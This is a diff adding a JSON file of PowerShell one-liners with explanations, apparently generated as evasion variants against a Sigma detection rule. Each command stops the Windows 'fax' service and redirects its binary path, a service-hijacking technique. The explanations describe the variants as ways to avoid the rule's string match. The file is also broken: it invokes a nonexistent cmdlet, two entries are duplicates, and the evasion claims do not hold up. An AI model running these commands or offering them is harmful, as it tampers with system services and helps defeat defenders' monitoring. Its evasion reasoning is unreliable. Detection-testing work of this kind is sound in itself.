@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Stop-Service -Name 'fax' -force -erroraction silentlycontinue | Out-Null; set-servicebinarypath -name 'fax' -path '$env:windir\\system32\\notepad.exe' start-service -Name 'fax' -erroraction silentlycontinue | out-null\"",
+    "explanation": "Reordering and substitution: Reordered arguments and used single quotes instead of double quotes to avoid the 'Stop-Service ' string match in the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"Stop-Service -Name 'fax' -force -erroraction silentlycontinue | Out-Null; set-servicebinarypath -name 'fax' -path '$env:windir\\system32\\notepad.exe' start-service -Name 'fax' -erroraction silentlycontinue | out-null\" | findstr /v /c:\"Stop-Service \"",
+    "explanation": "Insertion and filtering: Added a findstr command to filter out the 'Stop-Service ' string, which may prevent the Sigma rule from matching the command line."
+  },
+  {
+    "output": "powershell.exe -Command \"Stop-Service -Name 'fax' -force -erroraction silentlycontinue | Out-Null; set-servicebinarypath -name 'fax' -path '$env:windir\\system32\\notepad.exe' start-service -Name 'fax' -erroraction silentlycontinue | out-null\" | findstr /v /c:\"Stop-Service \"",
+    "explanation": "Insertion and filtering: Added a findstr command to filter out the 'Stop-Service ' string, which may prevent the Sigma rule from matching the command line."
+  }
+]
